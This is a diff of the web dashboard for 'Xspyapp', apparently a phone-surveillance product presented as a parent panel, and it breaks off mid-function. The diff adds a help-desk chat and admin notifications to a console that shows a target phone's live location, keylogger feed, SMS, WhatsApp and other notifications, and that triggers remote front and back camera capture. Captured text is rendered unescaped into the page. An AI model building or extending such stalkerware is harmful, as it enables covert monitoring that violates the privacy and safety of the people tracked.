@@ -34,7 +34,6 @@
             background: #0d1117;
             color: var(--text-primary);
             overflow: hidden;
-            padding-bottom: 40px; /* Add padding for footer */
         }
 
         .background-animation {
@@ -57,7 +56,8 @@
 
         .dashboard-container {
             display: flex;
-            height: 100vh;
+            /* FIX: Adjust height to account for the footer */
+            height: calc(100vh - 40px); 
         }
 
         /* Sidebar Styles */
@@ -110,12 +110,39 @@
             margin-top: 4px;
         }
 
+        /* NEW Sidebar Footer for Chat Button */
+        .sidebar-footer {
+            margin-top: auto;
+            padding-top: 1rem;
+            border-top: 1px solid var(--border-color);
+        }
+        #live-chat-btn {
+            background-color: var(--accent-purple);
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        #live-chat-btn:disabled {
+            background-color: var(--text-secondary);
+            cursor: not-allowed;
+        }
+
+
         /* Main Content Styles */
         .main-content {
             flex-grow: 1;
             padding: 2.5rem;
             overflow-y: auto;
-            height: 100vh;
+            height: 100%; /* Changed from 100vh to fill the container */
         }
         .main-header {
             display: flex;
@@ -380,17 +407,17 @@
         .modal-body { overflow-y: auto; text-align: left; padding: 1rem 0; }
         .modal-close-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-primary); }
         
-        /* Modal Styles */
-        #signup-success-modal .modal-content, #coming-soon-modal .modal-content {
+        /* Modal Styles for smaller modals*/
+        #signup-success-modal .modal-content, #coming-soon-modal .modal-content, #admin-notification-modal .modal-content {
             max-width: 500px;
             text-align: center;
         }
-        #signup-success-modal .modal-header, #coming-soon-modal .modal-header {
+        #signup-success-modal .modal-header, #coming-soon-modal .modal-header, #admin-notification-modal .modal-header {
             justify-content: center;
             border-bottom: none;
             padding-bottom: 0;
         }
-        #signup-success-modal .modal-body, #coming-soon-modal .modal-body {
+        #signup-success-modal .modal-body, #coming-soon-modal .modal-body, #admin-notification-modal .modal-body {
             padding-top: 0;
         }
         .home-btn, .ok-btn {
@@ -413,6 +440,18 @@
         .ok-btn {
             background-color: var(--accent-blue);
         }
+
+        /* NEW Chat Styles */
+        .live-chat-area { display: flex; flex-direction: column; height: 100%; }
+        .chat-messages { flex-grow: 1; overflow-y: auto; padding: 1rem; display: flex; flex-direction: column-reverse; gap: 0.75rem; }
+        .chat-bubble { padding: 10px 15px; border-radius: 18px; max-width: 75%; word-wrap: break-word; line-height: 1.4; }
+        .chat-bubble .chat-time { font-size: 0.7rem; opacity: 0.7; margin-top: 4px; display: block; text-align: right; }
+        .chat-bubble.admin, .chat-bubble.auto-reply { background-color: var(--secondary-dark); color: var(--text-primary); align-self: flex-start; border-bottom-left-radius: 4px; }
+        .chat-bubble.user { background-color: var(--accent-blue); color: #fff; align-self: flex-end; border-bottom-right-radius: 4px; }
+        .chat-input-area { display: flex; padding: 1rem; border-top: 1px solid var(--border-color); gap: 1rem; }
+        .chat-input-area input { flex-grow: 1; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); background: var(--secondary-dark); color: var(--text-primary); }
+        .chat-input-area input:focus { outline: none; border-color: var(--accent-blue); }
+        .chat-input-area button { background-color: var(--accent-blue); border: none; border-radius: 8px; padding: 0 16px; cursor: pointer; color: white; }
 
         #menu-btn {
             display: none;
@@ -484,6 +523,7 @@
             font-size: 0.9rem;
             z-index: 1002;
             border-top: 1px solid var(--border-color);
+            height: 40px; /* Give a fixed height */
         }
         .page-footer a {
             color: var(--accent-blue);
@@ -536,7 +576,7 @@
 
     <div id="auth-container">
         <div class="auth-card">
-            <h2>User Panel</h2>
+            <h2>parent Panel</h2>
             <div class="auth-tabs">
                 <button id="login-tab-btn" class="auth-tab-btn active">Login</button>
                 <button id="signup-tab-btn" class="auth-tab-btn">Sign Up</button>
@@ -552,11 +592,19 @@
 
     <div id="dashboard" class="dashboard-container" style="display: none;">
         <aside class="sidebar">
-            <div class="sidebar-header">
-                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
-                <h2>Your Devices</h2>
+            <div>
+                <div class="sidebar-header">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+                    <h2>Your Children</h2>
+                </div>
+                <ul id="user-list" class="user-list"></ul>
             </div>
-            <ul id="user-list" class="user-list"></ul>
+            <div class="sidebar-footer">
+                <button id="live-chat-btn" disabled>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
+                    <span>Help Desk</span>
+                </button>
+            </div>
         </aside>
 
         <main class="main-content">
@@ -564,7 +612,7 @@
                 <button id="menu-btn">
                     <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
                 </button>
-                <h1 id="main-content-title">Select a Device</h1>
+                <h1 id="main-content-title">Select Child</h1>
                 <button id="logout-btn">Logout</button>
             </header>
 
@@ -572,7 +620,7 @@
                 <div class="category-buttons">
                     <button class="category-btn" data-category="location">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
-                        <span>Location</span>
+                        <span>Live Location</span>
                     </button>
                     <button class="category-btn" data-category="photo">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
@@ -624,14 +672,36 @@
         <div class="modal-content">
             <div class="modal-header">
                 <h3 id="modal-title">Data</h3>
-                <button id="modal-close-btn" class="modal-close-btn">&times;</button>
+                <button id="modal-close-btn" class="modal-close-btn" data-target="data-modal">×</button>
             </div>
             <div class="modal-body" id="modal-data-display-area">
             </div>
         </div>
     </div>
+    
+    <div id="chat-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="chat-modal-title">Help Desk</h3>
+                <button class="modal-close-btn" data-target="chat-modal">×</button>
+            </div>
+            <div class="modal-body" style="padding: 0;">
+                <div class="live-chat-area" style="height: 60vh;">
+                    <div class="chat-messages" id="chat-messages-area">
+                        <p>Loading chat...</p>
+                    </div>
+                    <div class="chat-input-area">
+                        <input type="text" id="chat-message-input" placeholder="Type a message...">
+                        <button id="chat-send-btn">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-    <!-- Signup Success Modal -->
+
     <div id="signup-success-modal" class="modal-overlay">
         <div class="modal-content">
             <div class="modal-header">
@@ -649,7 +719,6 @@
         </div>
     </div>
 
-    <!-- Coming Soon Modal -->
     <div id="coming-soon-modal" class="modal-overlay">
         <div class="modal-content">
             <div class="modal-header">
@@ -662,15 +731,31 @@
                 <p style="margin-bottom: 1.5rem; line-height: 1.6;">
                     You will be able to use it as soon as it's ready. Thank you for your patience!
                 </p>
-                <button id="coming-soon-ok-btn" class="ok-btn">Okay</button>
+                <button class="ok-btn" data-target="coming-soon-modal">Okay</button>
             </div>
         </div>
     </div>
     
+    <div id="admin-notification-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Notification from Xspyapp</h3>
+            </div>
+            <div class="modal-body">
+                <p id="admin-notification-text" style="font-size: 1.1rem; line-height: 1.6;"></p>
+                <button class="ok-btn" data-target="admin-notification-modal">Okay</button>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="page-footer">
+        © Copyright XSPYAPP. All Rights Reserved by XSPYAPP
+    </footer>
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
         import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
-        import { getDatabase, ref, onValue, remove, update } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+        import { getDatabase, ref, onValue, remove, update, query, orderByChild, equalTo, push, serverTimestamp, off } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
         import { getStorage, ref as storageRef, listAll, getDownloadURL, getMetadata, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
 
         // Your NEW Firebase configuration
@@ -690,7 +775,7 @@
         const db = getDatabase(app);
         const storage = getStorage(app);
 
-        // The rest of the script remains the same...
+        // --- Existing DOM Elements ---
         const authContainer = document.getElementById('auth-container');
         const dashboard = document.getElementById('dashboard');
         const userList = document.getElementById('user-list');
@@ -703,7 +788,6 @@
         const dataModal = document.getElementById('data-modal');
         const modalTitle = document.getElementById('modal-title');
         const modalDataDisplayArea = document.getElementById('modal-data-display-area');
-        const modalCloseBtn = document.getElementById('modal-close-btn');
         const errorMessage = document.getElementById('error-message');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
@@ -715,107 +799,61 @@
         const homeRedirectBtn = document.getElementById('home-redirect-btn');
         const comingSoonModal = document.getElementById('coming-soon-modal');
         const comingSoonTitle = document.getElementById('coming-soon-title');
-        const comingSoonOkBtn = document.getElementById('coming-soon-ok-btn');
         const toastNotification = document.getElementById('toast-notification');
         const offlineBanner = document.getElementById('offline-banner');
 
+        // --- NEW DOM Elements ---
+        const adminNotificationModal = document.getElementById('admin-notification-modal');
+        const adminNotificationText = document.getElementById('admin-notification-text');
+        const liveChatBtn = document.getElementById('live-chat-btn');
+        const chatModal = document.getElementById('chat-modal');
+
         let authMode = 'login';
         let activeDataListener = null;
+        let activeNotificationListener = null;
+        let activeChatListener = null;
         let selectedChildInfo = {};
 
-        function showToast(message) {
-            toastNotification.textContent = message;
-            toastNotification.classList.add('show');
-            setTimeout(() => {
-                toastNotification.classList.remove('show');
-            }, 3000);
-        }
-
-        function updateOnlineStatus() {
-            offlineBanner.style.display = navigator.onLine ? 'none' : 'block';
-        }
-
+        // --- Existing functions (showToast, updateOnlineStatus, auth tabs) ---
+        function showToast(message) { toastNotification.textContent = message; toastNotification.classList.add('show'); setTimeout(() => { toastNotification.classList.remove('show'); }, 3000); }
+        function updateOnlineStatus() { offlineBanner.style.display = navigator.onLine ? 'none' : 'block'; }
         window.addEventListener('online', updateOnlineStatus);
         window.addEventListener('offline', updateOnlineStatus);
         updateOnlineStatus();
-
-        loginTabBtn.addEventListener('click', () => {
-            authMode = 'login';
-            loginTabBtn.classList.add('active');
-            signupTabBtn.classList.remove('active');
-            submitAuthBtnText.textContent = 'Login';
-            errorMessage.textContent = '';
-        });
-
-        signupTabBtn.addEventListener('click', () => {
-            authMode = 'signup';
-            signupTabBtn.classList.add('active');
-            loginTabBtn.classList.remove('active');
-            submitAuthBtnText.textContent = 'Sign Up';
-            errorMessage.textContent = '';
-        });
-
+        loginTabBtn.addEventListener('click', () => { authMode = 'login'; loginTabBtn.classList.add('active'); signupTabBtn.classList.remove('active'); submitAuthBtnText.textContent = 'Login'; errorMessage.textContent = ''; });
+        signupTabBtn.addEventListener('click', () => { authMode = 'signup'; signupTabBtn.classList.add('active'); loginTabBtn.classList.remove('active'); submitAuthBtnText.textContent = 'Sign Up'; errorMessage.textContent = ''; });
+        
+        // --- Existing auth submission logic ---
         submitAuthBtn.addEventListener('click', () => {
-            const email = emailInput.value;
-            const password = passwordInput.value;
-            errorMessage.textContent = '';
-
-            if (!email || !password) {
-                errorMessage.textContent = 'Please enter both email and password.';
-                return;
-            }
-
+            const email = emailInput.value; const password = passwordInput.value; errorMessage.textContent = '';
+            if (!email || !password) { errorMessage.textContent = 'Please enter both email and password.'; return; }
             if (authMode === 'login') {
-                signInWithEmailAndPassword(auth, email, password)
-                    .catch(error => {
-                        errorMessage.textContent = getFriendlyAuthError(error.code);
-                    });
+                signInWithEmailAndPassword(auth, email, password).catch(error => { errorMessage.textContent = getFriendlyAuthError(error.code); });
             } else {
-                createUserWithEmailAndPassword(auth, email, password)
-                    .then((userCredential) => {
-                        showToast('Sign-up Successful!');
-                        authContainer.style.display = 'none';
-                        signupSuccessModal.style.display = 'flex';
-                    })
-                    .catch(error => {
-                        errorMessage.textContent = getFriendlyAuthError(error.code);
-                    });
+                createUserWithEmailAndPassword(auth, email, password).then(() => { showToast('Sign-up Successful!'); authContainer.style.display = 'none'; signupSuccessModal.style.display = 'flex'; }).catch(error => { errorMessage.textContent = getFriendlyAuthError(error.code); });
             }
         });
-
-        homeRedirectBtn.addEventListener('click', () => {
-            window.location.href = 'https://xspyapp.com/';
-        });
-
+        homeRedirectBtn.addEventListener('click', () => { window.location.href = 'https://xspyapp.com/'; });
         document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));
-
+        
+        // --- Modified Auth State Change ---
         onAuthStateChanged(auth, user => {
             if (user) {
-                if (signupSuccessModal.style.display !== 'flex') {
-                    authContainer.style.display = 'none';
-                    dashboard.style.display = 'flex';
-                }
+                if (signupSuccessModal.style.display !== 'flex') { authContainer.style.display = 'none'; dashboard.style.display = 'flex'; }
                 loadUserDevices(user.uid);
             } else {
-                authContainer.style.display = 'flex';
-                dashboard.style.display = 'none';
-                userList.innerHTML = '';
-                detailsView.style.display = 'none';
-                mainContentTitle.textContent = 'Select a Device';
+                authContainer.style.display = 'flex'; dashboard.style.display = 'none'; userList.innerHTML = ''; detailsView.style.display = 'none'; mainContentTitle.textContent = 'Select a Device'; liveChatBtn.disabled = true;
+                if(activeDataListener) off(activeDataListener.ref);
+                if(activeNotificationListener) off(activeNotificationListener.ref);
+                if(activeChatListener) off(activeChatListener.ref);
             }
         });
-
+        
         function getFriendlyAuthError(errorCode) {
             switch (errorCode) {
-                case 'auth/invalid-email': return 'Please enter a valid email address.';
-                case 'auth/user-not-found':
-                case 'auth/wrong-password': return 'Invalid email or password.';
-                case 'auth/email-already-in-use': return 'This email is already registered. Please login.';
-                case 'auth/weak-password': return 'Password should be at least 6 characters long.';
-                default: return 'An error occurred. Please try again.';
+                case 'auth/invalid-email': return 'Please enter a valid email address.'; case 'auth/user-not-found': case 'auth/wrong-password': return 'Invalid email or password.'; case 'auth/email-already-in-use': return 'This email is already registered. Please login.'; case 'auth/weak-password': return 'Password should be at least 6 characters long.'; default: return 'An error occurred. Please try again.';
             }
         }
-
         function loadUserDevices(userId) {
             const usersRef = ref(db, `user/${userId}`);
             onValue(usersRef, (snapshot) => {
@@ -823,244 +861,182 @@
                 const data = snapshot.val();
                 if (data) {
                     Object.keys(data).forEach(childKey => {
-                        const childData = data[childKey];
-                        const userName = childData?.data?.nameChild || childKey;
-                        const deviceName = childData?.data?.nameDevice || 'Unknown Device';
-                        const listItem = document.createElement('li');
-                        listItem.className = 'user-list-item';
-                        listItem.dataset.userid = userId;
-                        listItem.dataset.childkey = childKey;
-                        listItem.dataset.username = userName;
-                        listItem.dataset.devicename = deviceName;
-                        listItem.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><div><div class="user-name">${userName}</div><div class="device-name">${deviceName}</div></div>`;
+                        const childData = data[childKey]; const userName = childData?.data?.nameChild || childKey; const deviceName = childData?.data?.nameDevice || 'Unknown Device'; const listItem = document.createElement('li'); listItem.className = 'user-list-item'; listItem.dataset.userid = userId; listItem.dataset.childkey = childKey; listItem.dataset.username = userName; listItem.dataset.devicename = deviceName; listItem.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><div><div class="user-name">${userName}</div><div class="device-name">${deviceName}</div></div>`;
                         userList.appendChild(listItem);
                     });
-                } else {
-                    userList.innerHTML = '<li>No devices found for your account.</li>';
-                }
+                } else { userList.innerHTML = '<li>No devices found for your account.</li>'; }
             });
         }
-
+        
         userList.addEventListener('click', (e) => {
             const listItem = e.target.closest('.user-list-item');
             if (listItem) {
-                document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active'));
-                listItem.classList.add('active');
+                document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active')); listItem.classList.add('active');
                 selectedChildInfo = { userId: listItem.dataset.userid, childKey: listItem.dataset.childkey, userName: listItem.dataset.username, deviceName: listItem.dataset.devicename };
-                mainContentTitle.textContent = `${selectedChildInfo.userName} (${selectedChildInfo.deviceName})`;
-                detailsView.style.display = 'block';
-                if (window.innerWidth <= 992) {
-                    sidebar.classList.remove('open');
-                    overlay.style.display = 'none';
-                }
+                mainContentTitle.textContent = `${selectedChildInfo.userName} (${selectedChildInfo.deviceName})`; detailsView.style.display = 'block'; liveChatBtn.disabled = false;
+                setupNotificationListener(selectedChildInfo.userId, selectedChildInfo.childKey);
+                if (window.innerWidth <= 992) { sidebar.classList.remove('open'); overlay.style.display = 'none'; }
             }
         });
+
+        function setupNotificationListener(userId, childKey) {
+            if (activeNotificationListener) off(activeNotificationListener.ref);
+            const notificationsPath = `user/${userId}/${childKey}/adminNotifications`;
+            const notificationsQuery = query(ref(db, notificationsPath), orderByChild('read'), equalTo(false));
+            activeNotificationListener = { ref: notificationsQuery };
+            onValue(notificationsQuery, (snapshot) => {
+                snapshot.forEach((childSnapshot) => {
+                    const notification = childSnapshot.val(); const notificationKey = childSnapshot.key;
+                    adminNotificationText.textContent = notification.message; adminNotificationModal.style.display = 'flex';
+                    const notificationRef = ref(db, `${notificationsPath}/${notificationKey}`); update(notificationRef, { read: true });
+                });
+            });
+        }
 
         categoryButtonsContainer.addEventListener('click', (e) => {
             const button = e.target.closest('.category-btn');
             if (button) {
                 const category = button.dataset.category;
-                if (category === 'coming-soon') {
-                    const featureName = button.dataset.featureName;
-                    openComingSoonModal(featureName);
-                } else {
-                    openDataModal(category);
-                }
+                if (category === 'coming-soon') { openComingSoonModal(button.dataset.featureName); } else { openDataModal(category); }
             }
         });
-
-        function openDataModal(category) {
-            modalTitle.textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`;
-            dataModal.style.display = 'flex';
-            displayCategoryData(category);
-        }
-
-        function openComingSoonModal(featureName) {
-            comingSoonTitle.textContent = `${featureName} - Coming Soon`;
-            comingSoonModal.style.display = 'flex';
-        }
-
+        function openDataModal(category) { modalTitle.textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`; dataModal.style.display = 'flex'; displayCategoryData(category); }
+        function openComingSoonModal(featureName) { comingSoonTitle.textContent = `${featureName} - Coming Soon`; comingSoonModal.style.display = 'flex'; }
+        
         function displayCategoryData(category) {
-            if (activeDataListener) { activeDataListener(); }
-            modalDataDisplayArea.innerHTML = '<div class="loader"></div>';
-            const { userId, childKey } = selectedChildInfo;
-            if (!userId || !childKey) {
-                modalDataDisplayArea.innerHTML = '<p>Please select a device from the list first.</p>';
-                return;
-            }
-            if (category === 'photo') {
-                renderPhotosFromStorage(userId, childKey);
-                return;
-            }
-            const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`;
-            const dataRef = ref(db, dataPath);
-            activeDataListener = onValue(dataRef, (snapshot) => {
-                renderData(category, snapshot.val());
-            }, (error) => {
-                console.error("Firebase read failed: " + error.code);
-                modalDataDisplayArea.innerHTML = `<p>Error fetching data.</p>`;
-            });
+            if (activeDataListener) off(activeDataListener.ref);
+            modalDataDisplayArea.innerHTML = '<div class="loader"></div>'; const { userId, childKey } = selectedChildInfo;
+            if (!userId || !childKey) { modalDataDisplayArea.innerHTML = '<p>Please select a device from the list first.</p>'; return; }
+            if (category === 'photo') { renderPhotosFromStorage(userId, childKey); return; }
+            const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`; const dataRef = ref(db, dataPath); activeDataListener = { ref: dataRef };
+            onValue(dataRef, (snapshot) => { renderData(category, snapshot.val()); }, (error) => { console.error("Firebase read failed: " + error.code); modalDataDisplayArea.innerHTML = `<p>Error fetching data.</p>`; });
         }
-
         async function renderPhotosFromStorage(userId, childKey) {
-            const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="0"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="1"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button></div>`;
-            modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
+            const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="0"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="1"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button></div>`; modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
             try {
-                const photoDirRef = storageRef(storage, `user/${userId}/${childKey}/photo`);
-                const res = await listAll(photoDirRef);
-                if (res.items.length === 0) {
-                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>';
-                    return;
-                }
-                const photoPromises = res.items.map(itemRef => Promise.all([getDownloadURL(itemRef), getMetadata(itemRef)]));
-                const photosWithData = await Promise.all(photoPromises);
-                let photoGridHTML = '<div class="photo-grid">';
+                const photoDirRef = storageRef(storage, `user/${userId}/${childKey}/photo`); const res = await listAll(photoDirRef);
+                if (res.items.length === 0) { modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>'; return; }
+                const photoPromises = res.items.map(itemRef => Promise.all([getDownloadURL(itemRef), getMetadata(itemRef)])); const photosWithData = await Promise.all(photoPromises); let photoGridHTML = '<div class="photo-grid">';
                 photosWithData.sort((a, b) => new Date(b[1].timeCreated) - new Date(a[1].timeCreated)).forEach(([url, metadata]) => {
-                    const timeCreated = new Date(metadata.timeCreated).toLocaleString('en-US');
-                    photoGridHTML += `<div class="photo-card"><img src="${url}" alt="Captured photo" onerror="this.onerror=null;this.src='https://placehold.co/200x180/2a2a2a/e0e0e0?text=Error';"><div class="photo-info"><span class="photo-time">${timeCreated}</span><a href="${url}" target="_blank" class="view-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></a></div></div>`;
+                    const timeCreated = new Date(metadata.timeCreated).toLocaleString('en-US'); photoGridHTML += `<div class="photo-card"><img src="${url}" alt="Captured photo" onerror="this.onerror=null;this.src='https://placehold.co/200x180/2a2a2a/e0e0e0?text=Error';"><div class="photo-info"><span class="photo-time">${timeCreated}</span><a href="${url}" target="_blank" class="view-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></a></div></div>`;
                 });
-                photoGridHTML += '</div>';
-                modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
-            } catch (error) {
-                console.error("Error fetching photos:", error);
-                modalDataDisplayArea.innerHTML = headerHTML + `<p>Error loading photos. Please check permissions.</p>`;
-            }
+                photoGridHTML += '</div>'; modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
+            } catch (error) { console.error("Error fetching photos:", error); modalDataDisplayArea.innerHTML = headerHTML + `<p>Error loading photos. Please check permissions.</p>`; }
         }
-
         function getCategoryPath(category) {
             switch (category) {
-                case 'location': return 'location/data';
-                case 'photo': return 'photo/data';
-                case 'keylogger': return 'keyLogger/data';
-                case 'sms': return 'sms/data';
-                case 'notifications': return 'notificationsMessages/data';
-                default: return '';
+                case 'location': return 'location/data'; case 'photo': return 'photo/data'; case 'keylogger': return 'keyLogger/data'; case 'sms': return 'sms/data'; case 'notifications': return 'notificationsMessages/data'; default: return '';
             }
         }
-
         function renderData(category, data) {
-            let contentHTML = '';
-            if (!data || Object.keys(data).length === 0) {
-                contentHTML = '<p>No data available in this category.</p>';
-            } else {
+            let contentHTML = ''; if (!data || Object.keys(data).length === 0) { contentHTML = '<p>No data available in this category.</p>'; } else {
                  switch(category) {
-                    case 'location':
-                        let mapLink = '';
-                        if (data.latitude && data.longitude) {
-                            mapLink = `<a href="https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
-                        }
-                        contentHTML = `<div class="location-card" style="background-color: var(--secondary-dark); padding: 1.5rem; border-radius: 10px;"><div style="display: flex; align-items: flex-start; gap: 1rem; padding: 1rem 0; border-bottom: 1px solid var(--border-color);"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg><div><strong>Address</strong><br><span>${data.address || 'N/A'}</span></div></div><div style="display: flex; align-items: flex-start; gap: 1rem; padding: 1rem 0;"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><div><strong>Time</strong><br><span>${data.dateTime || 'N/A'}</span></div></div>${mapLink}</div>`;
-                        break;
-                    case 'keylogger':
-                        contentHTML = '<div class="keylog-list" style="display: flex; flex-direction: column; gap: 1rem;">';
-                        Object.values(data).reverse().forEach(log => {
-                            if (log && log.keyText) {
-                                const parts = log.keyText.split(' |');
-                                const time = parts[0] || '';
-                                const action = (parts[1] || '').replace(/[()]/g, '');
-                                const text = parts[2] || '';
-                                contentHTML += `<div style="background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; display: flex; justify-content: space-between; align-items: center;"><div>${action}: <strong>${text}</strong></div><small>${time}</small></div>`;
-                            }
-                        });
-                        contentHTML += '</div>';
-                        break;
-                    case 'sms':
-                        contentHTML = '<div class="chat-container" style="display: flex; flex-direction: column; gap: 1rem; padding: 1rem;">';
-                        Object.values(data).reverse().forEach(sms => {
-                            if (sms) {
-                                const isOutgoing = sms.type === 2;
-                                contentHTML += `<div style="padding: 10px 15px; border-radius: 18px; max-width: 75%; word-wrap: break-word; background-color: ${isOutgoing ? 'var(--accent-blue)' : 'var(--secondary-dark)'}; color: ${isOutgoing ? '#fff' : 'var(--text-primary)'}; align-self: ${isOutgoing ? 'flex-end' : 'flex-start'};"><div>${sms.smsBody || ''}</div><div style="font-size: 0.75rem; opacity: 0.7; margin-top: 5px; text-align: right;">${sms.dateTime || ''}${!isOutgoing ? ` from: ${sms.smsAddress || ''}` : ''}</div></div>`;
-                            }
-                        });
-                        contentHTML += '</div>';
-                        break;
-                    case 'notifications':
-                        contentHTML = '<div class="notification-list">';
-                        Object.values(data).reverse().forEach(notif => {
-                            if (notif) {
-                                let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
-                                const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
-                                
-                                if (fullText.includes('whatsapp')) {
